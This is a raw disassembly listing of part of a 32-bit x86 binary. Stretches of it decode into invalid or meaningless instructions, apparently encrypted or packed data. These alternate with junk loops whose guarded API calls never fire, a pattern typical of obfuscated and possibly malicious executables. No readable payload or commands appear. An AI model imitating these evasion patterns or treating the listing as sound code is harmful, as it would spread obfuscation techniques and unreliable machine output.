  4030d9:	out    dx,al
  4030da:	xchg   esp,eax
  4030db:	push   0x34d0bcaa
  4030e0:	das    
  4030e1:	mov    eax,0x1ee96880
  4030e6:	scas   al,BYTE PTR es:[edi]
  4030e7:	mov    esp,0x1117d557
  4030ec:	xlat   BYTE PTR ds:[ebx]
  4030ed:	mov    cl,0x60
  4030ef:	mov    ds:0x99c9e0cd,al
  4030f4:	mov    DWORD PTR [edi-0x570c13c0],ebx
  4030fa:	sub    al,0xad
  4030fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030fd:	arpl   WORD PTR [edi-0x49988686],dx
  403103:	mov    eax,ds:0x4f86bc8f
  403108:	mov    edx,0xf77a42ef
  40310d:	sbb    ebp,esp
  40310f:	jb     0x40314a
  403111:	call   0x1f2a:0x93a09a89
  403118:	and    eax,0x5460a3be
  40311d:	jo     0x403134
  40311f:	fnsave [ebp+0x17]
  403122:	lock js 0x4030e5
  403125:	sub    BYTE PTR [eax],dh
  403127:	das    
  403128:	push   eax
  403129:	stos   BYTE PTR es:[edi],al
  40312a:	mov    ah,0x39
  40312c:	adc    al,0x14
  40312e:	or     eax,0xe310dd5f
  403133:	outs   dx,DWORD PTR ds:[esi]
  403134:	push   ecx
  403135:	stc    
  403136:	adc    al,0xd7
  403138:	cdq    
  403139:	dec    eax
  40313a:	mov    ecx,0xfe50ff88
  40313f:	mov    eax,DWORD PTR [ebp-0x38]
  403142:	mov    ecx,DWORD PTR ds:0x413bb0
  403148:	add    DWORD PTR [eax],ecx
  40314a:	pop    edi
  40314b:	jmp    0x4032ec
  403150:	add    dl,BYTE PTR [ecx]
  403152:	mov    BYTE PTR [ebx-0x4ede4c77],ch
  403158:	adc    BYTE PTR [edx-0x48a03ea4],0x9f
  40315f:	jg     0x40311b
  403161:	pop    ss
  403162:	jle    0x4031e2
  403164:	cli    
  403165:	jg     0x4031e5
  403167:	jle    0x403124
  403169:	pop    ds
  40316a:	xor    bl,BYTE PTR [ecx]
  40316c:	(bad)  
  40316d:	mov    esp,0xeb8f8270
  403172:	adc    DWORD PTR [ebp+0xe],ebp
  403175:	in     eax,0xe9
  403177:	mov    cl,0xad
  403179:	xchg   edx,eax
  40317a:	aam    0x72
  40317c:	cmp    ah,BYTE PTR [ebp+0x4c08cf16]
  403182:	(bad)  
  403183:	xchg   ecx,eax
  403184:	and    al,0xf7
  403186:	jle    0x403144
  403188:	ret    0xf96f
  40318b:	mov    dl,bh
  40318d:	dec    edx
  40318e:	xor    BYTE PTR [ebx+0x386d645f],dl
  403194:	lea    edx,[edx+0x6dc35008]
  40319a:	outs   dx,BYTE PTR ds:[esi]
  40319b:	fild   QWORD PTR [edi-0x229560cb]
  4031a1:	fst    st(1)
  4031a3:	stc    
  4031a4:	mov    ebx,0x9989210d
  4031a9:	shr    DWORD PTR [esi],1
  4031ab:	add    al,0xa0
  4031ad:	push   edx
  4031ae:	dec    edx
  4031af:	adc    esp,DWORD PTR [edi]
  4031b1:	retf   0x7d03
  4031b4:	(bad)  
  4031b6:	sbb    eax,0xa1c15413
  4031bb:	cs dec edx
  4031bd:	aaa    
  4031be:	mov    ds:0x6bdffc1a,ax
  4031c4:	fild   DWORD PTR [ebx]
  4031c6:	mov    ecx,0xa5ce3b52
  4031cb:	in     eax,0x90
  4031cd:	aam    0xfa
  4031cf:	es sbb eax,0xbf6578a0
  4031d5:	or     BYTE PTR [ebx],al
  4031d7:	push   0xff646623
  4031dc:	dec    edx
  4031dd:	imul   edx,DWORD PTR [ebx],0x2b
  4031e0:	out    0xf0,eax
  4031e2:	shr    BYTE PTR [esi+0x3083f4f7],cl
  4031e8:	push   ss
  4031e9:	aam    0x5e
  4031eb:	adc    eax,0xb749a0dc
  4031f0:	xor    bl,BYTE PTR [ecx-0x11c731f9]
  4031f6:	aaa    
  4031f7:	xchg   esp,eax
  4031f8:	sub    al,0xec
  4031fa:	ins    BYTE PTR es:[edi],dx
  4031fb:	and    BYTE PTR [ecx-0x6dd80ba3],cl
  403201:	xor    eax,0x9a58dcbc
  403206:	adc    al,0x27
  403208:	outs   dx,BYTE PTR ds:[esi]
  403209:	xchg   edx,eax
  40320a:	xchg   BYTE PTR [bx-0x5e],ch
  40320e:	mov    al,ds:0xb7f1ba80
  403213:	sti    
  403214:	xchg   ecx,eax
  403215:	dec    eax
  403216:	loopne 0x40327a
  403218:	sahf   
  403219:	dec    ebp
  40321a:	adc    edi,edi
  40321c:	scas   eax,DWORD PTR es:[edi]
  40321d:	xchg   ebx,eax
  40321e:	(bad)  
  40321f:	push   0xffffffd3
  403221:	cwde   
  403222:	stos   BYTE PTR es:[edi],al
  403223:	bnd jnp 0x4031d8
  403226:	dec    ebx
  403227:	and    ebx,DWORD PTR [ebx-0x74e0b0e0]
  40322d:	jo     0x403284
  40322f:	and    BYTE PTR [edx+0x53],bl
  403232:	and    eax,0x84d40ad9
  403237:	fcos   
  403239:	shl    DWORD PTR [edx+0x26dde5ea],cl
  40323f:	out    dx,al
  403240:	dec    edi
  403241:	das    
  403242:	jns    0x403225
  403244:	aam    0xc3
  403246:	xor    dh,ch
  403248:	loop   0x4032ba
  40324a:	fwait
  40324b:	jo     0x4031ef
  40324d:	sub    BYTE PTR [ebx+0x26b8e68c],bh
  403253:	pop    ecx
  403254:	xchg   edx,eax
  403255:	mov    ecx,0x5ab19f47
  40325a:	or     DWORD PTR [eax],0xffffffe4
  40325d:	sub    eax,0x2c0abe21
  403262:	inc    ebp
  403263:	dec    ebx
  403264:	pusha  
  403265:	mov    bh,0x22
  403267:	jmp    0x403229
  403269:	push   0xb1216588
  40326e:	call   0xbd2e:0xdc987a5d
  403275:	xor    dl,BYTE PTR [edx]
  403277:	cmp    bl,dl
  403279:	mov    ds:0xc76c94e5,eax
  40327e:	imul   esp,DWORD PTR [edx+0x4c4b1a21],0x24
  403285:	mov    eax,ds:0xa2e180b7
  40328a:	jl     0x403233
  40328c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40328d:	dec    ebx
  40328e:	jge    0x403275
  403290:	and    eax,esp
  403292:	pop    eax
  403293:	pusha  
  403294:	and    al,0x4a
  403296:	imul   ecx,DWORD PTR [esp+ebp*2],0x5
  40329a:	imul   esi,DWORD PTR [ecx-0x7df48e41],0xc52bb0e2
  4032a4:	sbb    WORD PTR [esi-0x34],0xffe7
  4032a9:	outs   dx,DWORD PTR ds:[esi]
  4032aa:	lods   eax,DWORD PTR ds:[esi]
  4032ac:	pop    edx
  4032ad:	dec    ebp
  4032ae:	mov    edx,DWORD PTR [esi-0x67]
  4032b1:	inc    edi
  4032b2:	mov    ebp,0x2992772
  4032b7:	mov    eax,0x4175f35b
  4032bc:	or     ebx,ebx
  4032be:	sub    ecx,ebp
  4032c0:	std    
  4032c1:	mov    ds:0x8acc374b,eax
  4032c6:	xor    edx,DWORD PTR [edx]
  4032c8:	ror    BYTE PTR [edi+0x13186b37],cl
  4032ce:	ret    0xf9a2
  4032d1:	fsubrp st(2),st
  4032d3:	or     eax,DWORD PTR [edx-0x450d74f6]
  4032d9:	cmp    esp,esi
  4032db:	rcl    al,0x6
  4032de:	arpl   WORD PTR [edi-0x4d8eb4f],ax
  4032e4:	and    bh,BYTE PTR [edi+0x26]
  4032e7:	pop    ds
  4032e8:	sub    eax,0x5eedadc7
  4032ed:	pop    ebx
  4032ee:	leave  
  4032ef:	ret    
  4032f0:	push   ebp
  4032f1:	mov    ebp,esp
  4032f3:	sub    esp,0x2c
  4032f6:	leave  
  4032f7:	ret    0x10
  4032fa:	push   ebp
  4032fb:	mov    ebp,esp
  4032fd:	sub    esp,0x44
  403300:	push   edi
  403301:	mov    eax,DWORD PTR [ebp+0xc]
  403304:	and    DWORD PTR ds:0x43375b,0x0
  40330e:	xor    ecx,ecx
  403310:	add    ecx,DWORD PTR ds:0x43375b
  403316:	inc    ecx
  403317:	mov    DWORD PTR ds:0x43375b,ecx
  40331d:	cmp    DWORD PTR ds:0x43375b,0x26
  403324:	jne    0x403335
  40332a:	push   0x476d
  40332f:	call   DWORD PTR ds:0x412278
  403335:	cmp    DWORD PTR ds:0x43375b,0x1d
  40333c:	jb     0x40330e
  403342:	not    edx
  403344:	mov    DWORD PTR [ebp-0x10],eax
  403347:	xor    DWORD PTR ds:0x4337ef,0x1717
  403351:	mov    eax,DWORD PTR [ebp+0x8]
  403354:	sbb    DWORD PTR ds:0x4337d7,0x2700
  40335e:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  403365:	mov    ecx,DWORD PTR ds:0x43371f
  40336b:	add    DWORD PTR ds:0x433703,ecx
  403371:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  403378:	xor    edi,0x7913
  40337e:	mov    edx,DWORD PTR [ebp+0x8]
  403381:	mov    DWORD PTR ds:0x433757,0x1e
  40338b:	cmp    DWORD PTR ds:0x433757,0x0
  403392:	je     0x4033dc
  403398:	cmp    DWORD PTR ds:0x433757,0xb
  40339f:	jne    0x4033ae
  4033a5:	push   DWORD PTR [ebp-0x18]
  4033a8:	call   DWORD PTR ds:0x41227c
  4033ae:	cmp    DWORD PTR ds:0x433757,0xc
  4033b5:	jne    0x4033c8
  4033bb:	mov    edi,DWORD PTR ds:0x433757
  4033c1:	dec    edi
  4033c2:	mov    DWORD PTR ds:0x433757,edi
  4033c8:	xor    edi,edi
  4033ca:	add    edi,DWORD PTR ds:0x433757
  4033d0:	dec    edi
  4033d1:	mov    DWORD PTR ds:0x433757,edi
  4033d7:	jmp    0x40338b
  4033dc:	mov    DWORD PTR [ebp-0x40],eax
  4033df:	dec    DWORD PTR ds:0x4337e7
  4033e5:	mov    eax,0x7510854
  4033ea:	xor    edx,eax
  4033ec:	mov    ecx,DWORD PTR ds:0x433747
  4033f2:	mov    edi,DWORD PTR ds:0x433787
  4033f8:	sub    ecx,edi
  4033fa:	imul   ecx,DWORD PTR [ecx+edi*1]
  4033fe:	mov    ecx,0x32729b
  403403:	add    edx,ecx
  403405:	mov    DWORD PTR ds:0x433767,0x1c
  40340f:	cmp    DWORD PTR ds:0x433767,0x0
  403416:	je     0x40345e
  40341c:	cmp    DWORD PTR ds:0x433767,0xa
  403423:	jne    0x403432
  403429:	push   DWORD PTR [ebp-0x24]
  40342c:	call   DWORD PTR ds:0x412288
  403432:	cmp    DWORD PTR ds:0x433767,0xb
  403439:	jne    0x40344c
  40343f:	mov    edi,DWORD PTR ds:0x433767
  403445:	dec    edi
  403446:	mov    DWORD PTR ds:0x433767,edi
  40344c:	mov    edi,DWORD PTR ds:0x433767
  403452:	dec    edi
  403453:	mov    DWORD PTR ds:0x433767,edi
  403459:	jmp    0x40340f
  40345e:	mov    DWORD PTR [ebp-0x8],edx
  403461:	mov    edx,DWORD PTR ds:0x4337e3
  403467:	and    edx,DWORD PTR ds:0x433817
  40346d:	mov    DWORD PTR ds:0x4337e3,edx
  403473:	mov    edx,DWORD PTR [ebp+0x8]
  403476:	sbb    DWORD PTR ds:0x43379b,0x6be7
  403480:	xor    edx,eax
  403482:	add    edx,ecx
  403484:	not    edi
  403486:	mov    DWORD PTR [ebp+0xc],edx
  403489:	not    edi
  40348b:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  403492:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403499:	mov    edx,DWORD PTR ds:0x43381f
  40349f:	adc    DWORD PTR ds:0x4336ff,edx
  4034a5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4034ac:	adc    edx,edx
  4034ae:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4034b5:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  4034bc:	mov    DWORD PTR ds:0x433817,0x10
  4034c6:	cmp    DWORD PTR ds:0x433817,0x0
  4034cd:	je     0x403517
  4034d3:	cmp    DWORD PTR ds:0x433817,0x9
  4034da:	jne    0x4034eb
  4034e0:	push   0x5d47
  4034e5:	call   DWORD PTR ds:0x41233c
  4034eb:	cmp    DWORD PTR ds:0x433817,0xa
  4034f2:	jne    0x403505
  4034f8:	mov    edi,DWORD PTR ds:0x433817
  4034fe:	dec    edi
  4034ff:	mov    DWORD PTR ds:0x433817,edi
  403505:	mov    edi,DWORD PTR ds:0x433817
  40350b:	dec    edi
  40350c:	mov    DWORD PTR ds:0x433817,edi
  403512:	jmp    0x4034c6
  403517:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40351e:	and    DWORD PTR ds:0x43382b,ecx
  403524:	jmp    0x403827
  403529:	sbb    ecx,ebp
  40352b:	add    ah,dl
  40352d:	lock shr ebx,1
  403530:	icebp  
  403531:	mov    ?,WORD PTR [ebp+0x7808d48a]
  403537:	ror    DWORD PTR [eax],1
  403539:	(bad)  
  40353a:	adc    eax,0x7c587e7e
  40353f:	jle    0x4035bf
  403541:	inc    esp
  403542:	and    al,0x4f
  403544:	scas   al,BYTE PTR es:[edi]
  403545:	test   al,0xcd
  403547:	and    eax,0x39ac4716
  40354c:	mov    ebx,0x9e5f0e98
  403551:	and    eax,0x97b291f2
  403556:	push   0xffffffc5
  403558:	push   esi
  403559:	pop    esp
  40355a:	xor    cl,BYTE PTR [eax+0x66]
  40355d:	in     al,dx
  40355e:	and    al,0xbf
  403560:	nop
  403561:	aas    
  403562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403563:	xchg   ecx,eax
  403564:	dec    ebp
  403565:	int    0x38
  403567:	clc    
  403568:	scas   al,BYTE PTR es:[edi]
  403569:	dec    ebp
  40356a:	dec    esi
  40356b:	pop    eax
  40356c:	sbb    ch,ch
  40356e:	repnz xor al,0x82
  403571:	stos   DWORD PTR es:[edi],eax
  403572:	sbb    DWORD PTR [esi-0x19],ecx
  403575:	adc    dl,al
  403577:	push   ss
  403578:	data16 add al,0xc1
  40357b:	jecxz  0x40357f
  40357d:	xor    eax,0xe0fef5cf
  403582:	sub    al,0x2b
  403584:	adc    BYTE PTR ds:0x623a86b1,cl
  40358a:	dec    esi
  40358b:	xor    edx,DWORD PTR ds:0x659cb367
  403591:	mov    eax,0xf4cad3e7
  403596:	aas    
  403597:	sahf   
  403598:	retf   
  403599:	xchg   esp,eax
  40359a:	xor    eax,DWORD PTR [ebp-0x15]
  40359d:	add    eax,0xc4565c63
  4035a2:	and    al,0xa1
  4035a4:	inc    esp
  4035a5:	arpl   WORD PTR [eax+0x1f7a43f8],bp
  4035ab:	idiv   eax
  4035ad:	push   0x829b3307
  4035b2:	push   0xffffff9a
  4035b4:	mov    ch,BYTE PTR [edi-0x7bb856c8]
  4035ba:	rcr    BYTE PTR [esi-0x5ee12362],cl
  4035c0:	push   edi
  4035c1:	inc    ecx
  4035c2:	add    esi,ebx
  4035c4:	dec    esp
  4035c5:	(bad)  
  4035c6:	call   0xa7b4:0xaa999e6a
  4035cd:	es stos BYTE PTR es:[edi],al
  4035cf:	jae    0x403616
  4035d1:	pop    ss
  4035d2:	push   ecx
  4035d3:	push   cs
  4035d4:	cld    
  4035d5:	into   
  4035d6:	or     bl,BYTE PTR [ebx]
  4035d8:	ins    BYTE PTR es:[edi],dx
  4035d9:	enter  0xaedb,0x8
  4035dd:	dec    ecx
  4035de:	adc    BYTE PTR [ebx+0x36],ah
  4035e1:	mov    ah,0x2f
  4035e3:	out    0x60,al
  4035e5:	mov    ch,0x8a
  4035e7:	fs xchg edi,eax
  4035e9:	or     dl,BYTE PTR [esi+ebp*1]
  4035ec:	dec    edx
  4035ed:	add    DWORD PTR [edx-0x4b],edx
  4035f0:	int    0x2a
  4035f2:	dec    edi
  4035f3:	jl     0x4035bc
  4035f5:	mov    eax,0xa4869593
  4035fa:	mov    ah,0xcb
  4035fc:	das    
  4035fd:	xchg   esi,eax
  4035fe:	push   edi
  4035ff:	xor    BYTE PTR [edx+0x3c],0x62
  403603:	jns    0x4035a8
  403605:	mov    ?,WORD PTR [eax]
  403607:	inc    edi
  403608:	out    0x25,al
  40360a:	pop    ebp
  40360b:	es push ebp
  40360d:	scas   eax,DWORD PTR es:[edi]
  40360e:	cs cmp al,0x13
  403611:	mov    dl,0x58
  403613:	out    dx,eax
  403614:	(bad)  
  403617:	mov    bh,0x67
  403619:	inc    ebx
  40361a:	popf   
  40361b:	stc    
  40361c:	pusha  
  40361d:	out    0x28,al
  40361f:	xchg   ebx,eax
  403620:	push   ecx
  403621:	in     al,0x1
  403623:	inc    edi
  403624:	push   esp
  403625:	dec    eax
  403626:	(bad)  
  403627:	mov    ah,0xe8
  403629:	outs   dx,BYTE PTR ds:[esi]
  40362a:	inc    ebp
  40362b:	test   DWORD PTR [eax],edx
  40362d:	pop    ecx
  40362e:	push   DWORD PTR [edx]
  403630:	mov    eax,0x2b65cc37
  403635:	sahf   
  403636:	dec    ebp
  403637:	loop   0x40366b
  403639:	xlat   BYTE PTR ds:[ebx]
  40363a:	mov    DWORD PTR [ebx],ebp
  40363c:	mov    dl,0xe1
  40363e:	cmc    
  40363f:	jns    0x403690
  403641:	cmc    
  403642:	or     BYTE PTR [esi-0x2d],bh
  403645:	(bad)  
  403646:	shr    BYTE PTR [ebx],1
  403648:	push   ss
  403649:	xor    al,0x39
  40364b:	(bad)  
  40364c:	add    ebx,DWORD PTR [eax+0x60]
  40364f:	mov    esi,0x2099ee37
  403654:	push   cs
  403655:	(bad)  
  403656:	sub    al,0x29
  403658:	leave  
  403659:	jg     0x4036c6
  40365b:	cmp    eax,ebx
  40365d:	stos   DWORD PTR es:[edi],eax
  40365e:	out    dx,eax
  40365f:	cwde   
  403660:	popf   
  403661:	add    al,0x65
  403663:	pop    ds
  403664:	test   DWORD PTR ds:0x86e72d5d,esi
  40366a:	cmp    BYTE PTR [ebx-0x78],bh
  40366d:	loop   0x4036c9
  40366f:	call   DWORD PTR [esp+ebx*8+0x6d7fdccc]
  403676:	push   es
  403677:	dec    esp
  403678:	jmp    FWORD PTR [edx+0x58beb430]
  40367e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40367f:	push   cs
  403680:	xchg   ecx,eax
  403681:	rcl    BYTE PTR [esi+0x4d],cl
  403684:	inc    esi
  403685:	pop    edx
  403686:	inc    ebp
  403687:	jb     0x4036be
  403689:	inc    edi
  40368a:	cmp    BYTE PTR [eax+0x155a3b8b],dl
  403690:	aad    0xb2
  403692:	pop    ecx
  403693:	stos   DWORD PTR es:[edi],eax
  403694:	jp     0x4036db
  403696:	jae    0x40370b
  403698:	std    
  403699:	adc    BYTE PTR [ebx+0x90dacba],cl
  40369f:	call   0x4af8997b
  4036a4:	sbb    esp,ebx
  4036a6:	pop    eax
  4036a7:	and    ebp,esi
  4036a9:	outs   dx,DWORD PTR ds:[esi]
  4036aa:	mov    dl,BYTE PTR [ebp-0x233afae3]
  4036b0:	sbb    DWORD PTR [ebx+edi*1],ebx
  4036b3:	or     al,0x62
  4036b5:	and    al,0x1a
  4036b7:	arpl   WORD PTR [edi],si
  4036b9:	dec    edi
  4036ba:	mov    esp,0x3cb0da35
  4036bf:	das    
  4036c0:	mov    edi,0xe3801878
  4036c5:	add    dh,bl
  4036c7:	dec    ecx
  4036c8:	jmp    0x403699
  4036ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036cb:	mov    ch,0x29
  4036cd:	leave  
  4036ce:	mov    esp,DWORD PTR [edi+0x41]
  4036d1:	pop    ebx
  4036d2:	les    ebp,FWORD PTR [ecx+0x4a]
  4036d5:	xchg   edx,eax
  4036d6:	jecxz  0x40366e
  4036d8:	out    dx,al
  4036d9:	out    0x9d,al
  4036db:	jg     0x4036c2
  4036dd:	pop    ss
  4036de:	fcmovnb st,st(4)
  4036e0:	ins    BYTE PTR es:[edi],dx
  4036e1:	leave  
  4036e2:	cmp    dl,BYTE PTR [edx+0x7b]
  4036e5:	or     DWORD PTR [ebp+0x797f657e],ecx
  4036eb:	inc    edi
  4036ec:	lods   al,BYTE PTR ds:[esi]
  4036ed:	cmp    eax,0x2ac3e58a
  4036f2:	add    ebp,esi
  4036f4:	lods   al,BYTE PTR ds:[esi]
  4036f5:	std    
  4036f6:	fisttp DWORD PTR [edx+eiz*2-0x52f1d512]
  4036fd:	xor    eax,ebx
  4036ff:	mov    esp,0x7d7d4873
  403704:	pop    ss
  403705:	test   DWORD PTR [edx-0x6c],0xf6b21047
  40370c:	scas   eax,DWORD PTR es:[edi]
  40370d:	hlt    
  40370e:	out    0x8f,al
  403710:	fdivr  DWORD PTR [edx+0x284b249d]
  403716:	push   ebp
  403717:	or     al,0xba
  403719:	ret    0x32c3
  40371c:	aaa    
  40371d:	sub    BYTE PTR [eax],al
  40371f:	js     0x4036c3
  403721:	add    DWORD PTR [eax-0x45a3c68c],eax
  403727:	cli    
  403728:	cmp    al,0x71
  40372a:	xchg   edx,eax
  40372b:	and    BYTE PTR [eax-0x3b],dh
  40372e:	push   es
  40372f:	sbb    bl,ch
  403731:	xchg   ah,al
  403733:	repnz icebp 
  403735:	loop   0x40372a
  403737:	dec    ecx
  403738:	test   eax,0x5d1126cd
  40373d:	lods   eax,DWORD PTR ds:[esi]
  40373e:	push   edi
  40373f:	mov    cl,0x61
  403741:	sbb    ah,BYTE PTR [ecx+0x57559fad]
  403747:	mov    ecx,0x79885fb7
  40374c:	int3   
  40374d:	scas   eax,DWORD PTR es:[edi]
  40374e:	aad    0x9d
  403750:	das    
  403751:	mov    DWORD PTR [ebx+0x21],ebx
  403754:	cmp    eax,0x19e02bcd
  403759:	das    
  40375a:	gs inc esp
  40375c:	pop    edx
  40375d:	push   ecx
  40375e:	push   cs
  40375f:	cmp    eax,0x10d9a8c6
  403764:	rcr    DWORD PTR [esi-0x5aa801c7],0xf7
  40376b:	push   ebx
  40376c:	mov    esp,0x51c539a7
  403771:	mov    dh,0xb1
  403773:	icebp  
  403774:	cdq    
  403775:	lock (bad) [edi-0x4f]
  403779:	out    dx,al
  40377a:	xor    BYTE PTR [ecx+0x2d],0x7e
  40377e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40377f:	(bad)  
  403780:	mov    ebx,0x76a35925
  403785:	dec    edx
  403786:	mov    cl,0x99
  403788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403789:	(bad)  
  40378a:	jmp    0x403763
  40378c:	or     eax,0x9201753a
  403791:	les    eax,FWORD PTR ds:0x89373834
  403797:	(bad)  
  403798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403799:	lods   eax,DWORD PTR ds:[esi]
  40379a:	std    
  40379b:	loope  0x4037f7
  40379d:	sbb    eax,0x13b5c565
  4037a2:	ins    BYTE PTR es:[edi],dx
  4037a3:	ds out 0x1c,al
  4037a6:	enter  0x4e96,0xdf
  4037aa:	push   eax
  4037ab:	std    
  4037ac:	mov    ecx,0x2e056ef8
  4037b1:	mov    edx,0x5b1169e2
  4037b6:	cmp    eax,0x7993659c
  4037bb:	pop    esp
  4037bc:	scas   eax,DWORD PTR es:[edi]
  4037bd:	xchg   esp,eax
  4037be:	outs   dx,DWORD PTR ds:[esi]
  4037bf:	mov    eax,0x589e9044
  4037c4:	pop    ebp
  4037c5:	xor    al,0x69
  4037c7:	jbe    0x403798
  4037c9:	out    dx,al
  4037ca:	(bad)  
  4037cb:	or     ebx,DWORD PTR [ecx]
  4037cd:	pop    esi
  4037ce:	cmp    eax,0x9563ee6b
  4037d3:	ja     0x40381f
  4037d5:	dec    ecx
  4037d6:	leave  
  4037d7:	push   edi
  4037d8:	adc    DWORD PTR [edi-0x7ead9504],esp
  4037de:	clc    
  4037df:	adc    BYTE PTR [edx-0x26],0x3f
  4037e3:	jb     0x4037f7
  4037e5:	aaa    
  4037e6:	xor    DWORD PTR [eax+0x1a],edx
  4037e9:	data16 ss sbb bh,dh
  4037ed:	or     al,0x55
  4037ef:	or     esi,DWORD PTR [ebx-0x15b6520f]
  4037f5:	stos   DWORD PTR es:[edi],eax
  4037f6:	mov    edi,0x16872315
  4037fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4037fc:	aas    
  4037fd:	add    al,0xbd
  4037ff:	dec    edi
  403800:	pop    esi
  403801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403802:	loop   0x4037e0
  403804:	retf   0xe2d8
  403807:	mov    ebp,0x91dd881
  40380c:	mov    bl,0xaa
  40380e:	xor    cl,dh
  403810:	les    ebx,FWORD PTR [ebx+edi*1+0x243e9fce]
  403817:	es dec edx
  403819:	xchg   edx,eax
  40381a:	mov    edx,DWORD PTR [ebx+0x326f355a]
  403820:	rol    edi,0xb7
  403823:	mov    esp,0xc7376d56
  403828:	inc    ebp
  403829:	les    edi,FWORD PTR [eax]
  40382b:	test   DWORD PTR [eax+edi*8+0x36fb3d1b],ebx
  403832:	inc    ebx
  403833:	add    BYTE PTR [ebx+0x3d1b0855],cl
  403839:	stos   DWORD PTR es:[edi],eax
  40383a:	aaa    
  40383b:	inc    ebx
  40383c:	add    BYTE PTR [ebx],dh
  40383e:	rol    BYTE PTR [ecx+0x43382725],1
  403844:	add    BYTE PTR [eax],al
  403846:	add    BYTE PTR [eax],al
  403848:	add    BYTE PTR [ebx],dh
  40384a:	inc    DWORD PTR [ebx]
  40384c:	cmp    eax,0x433827
  403851:	inc    edi
  403852:	mov    DWORD PTR ds:0x433827,edi
  403858:	cmp    DWORD PTR ds:0x433827,0xc
  40385f:	jne    0x403882
  403865:	push   0x86d9
  40386a:	push   0x47ad
  40386f:	push   0x8605
  403874:	push   DWORD PTR [ebp-0x24]
  403877:	push   0x3fd8
  40387c:	call   DWORD PTR ds:0x41228c
  403882:	cmp    DWORD PTR ds:0x433827,0xb
  403889:	jne    0x40389c
  40388f:	mov    edi,DWORD PTR ds:0x433827
  403895:	inc    edi
  403896:	mov    DWORD PTR ds:0x433827,edi
  40389c:	cmp    DWORD PTR ds:0x433827,0x17
  4038a3:	jb     0x403849
  4038a9:	or     edi,0x3f73
  4038af:	mov    edi,DWORD PTR [ebp-0x10]
  4038b2:	sub    DWORD PTR ds:0x43376b,0x43382b
  4038bc:	add    edx,ecx
  4038be:	mov    DWORD PTR ds:0x433793,0x73ae
  4038c8:	cmp    edi,edx
  4038ca:	mov    DWORD PTR ds:0x4337eb,0x7cd1
  4038d4:	je     0x4057b4
  4038da:	mov    DWORD PTR ds:0x433827,0x58cf
  4038e4:	push   ebx
  4038e5:	jmp    0x40578f
  4038ea:	xor    DWORD PTR ds:0x4337eb,0x4337ab
  4038f4:	mov    edx,DWORD PTR [ebp-0x8]
  4038f7:	sub    DWORD PTR ds:0x4336fb,ecx
  4038fd:	mov    edi,DWORD PTR [ebp-0x10]
  403900:	sub    edi,edx
  403902:	xor    DWORD PTR ds:0x433717,edi
  403908:	mov    edx,DWORD PTR [ebp-0x4]
  40390b:	xor    DWORD PTR ds:0x433713,0x16cd
  403915:	xor    edx,eax
  403917:	mov    DWORD PTR ds:0x43381b,0x2437
  403921:	add    edx,ecx
  403923:	cmp    edi,edx
  403925:	jb     0x4057b3
  40392b:	mov    DWORD PTR ds:0x4336ff,0x1d
  403935:	cmp    DWORD PTR ds:0x4336ff,0x0
  40393c:	je     0x40399d
  403942:	cmp    DWORD PTR ds:0x4336ff,0x6
  403949:	jne    0x40396b
  40394f:	push   DWORD PTR [ebp-0x28]
  403952:	push   DWORD PTR [ebp-0x14]
  403955:	push   0x0
  403957:	push   0x6853
  40395c:	push   DWORD PTR [ebp-0x20]
  40395f:	push   DWORD PTR [ebp-0x1c]
  403962:	push   DWORD PTR [ebp-0xc]
  403965:	call   DWORD PTR ds:0x4120b8
  40396b:	cmp    DWORD PTR ds:0x4336ff,0x7
  403972:	jne    0x403985
  403978:	mov    ebx,DWORD PTR ds:0x4336ff
  40397e:	dec    ebx
  40397f:	mov    DWORD PTR ds:0x4336ff,ebx
  403985:	mov    ebx,DWORD PTR ds:0x4336ff
  40398b:	dec    ebx
  40398c:	mov    DWORD PTR ds:0x4336ff,ebx
  403992:	jmp    0x403935
  403997:	xor    edx,DWORD PTR ds:0x433767
  40399d:	mov    edx,DWORD PTR [ebp-0x28]
  4039a0:	mov    edi,DWORD PTR ds:0x433713
  4039a6:	sub    edi,DWORD PTR ds:0x433823
  4039ac:	mov    DWORD PTR ds:0x433713,edi
  4039b2:	mov    edi,DWORD PTR [ebp-0x4]
  4039b5:	xor    edx,eax
  4039b7:	mov    DWORD PTR ds:0x433707,0x1b
  4039c1:	cmp    DWORD PTR ds:0x433707,0x0
  4039c8:	je     0x4039fe
  4039ce:	cmp    DWORD PTR ds:0x433707,0x26
  4039d5:	jne    0x4039e4
  4039db:	push   DWORD PTR [ebp-0x18]
  4039de:	call   DWORD PTR ds:0x4120bc
  4039e4:	xor    ebx,ebx
  4039e6:	xor    ebx,DWORD PTR ds:0x433707
  4039ec:	dec    ebx
  4039ed:	mov    DWORD PTR ds:0x433707,ebx
  4039f3:	jmp    0x4039c1
  4039f8:	neg    DWORD PTR ds:0x433717
  4039fe:	xor    edi,eax
  403a00:	and    DWORD PTR ds:0x4336fb,0x0
  403a0a:	xor    ebx,ebx
  403a0c:	or     ebx,DWORD PTR ds:0x4336fb
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x4336fb,ebx
  403a19:	cmp    DWORD PTR ds:0x4336fb,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x4336fb,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x4337d7,0x19
  403a4c:	cmp    DWORD PTR ds:0x4337d7,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x4337d7,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
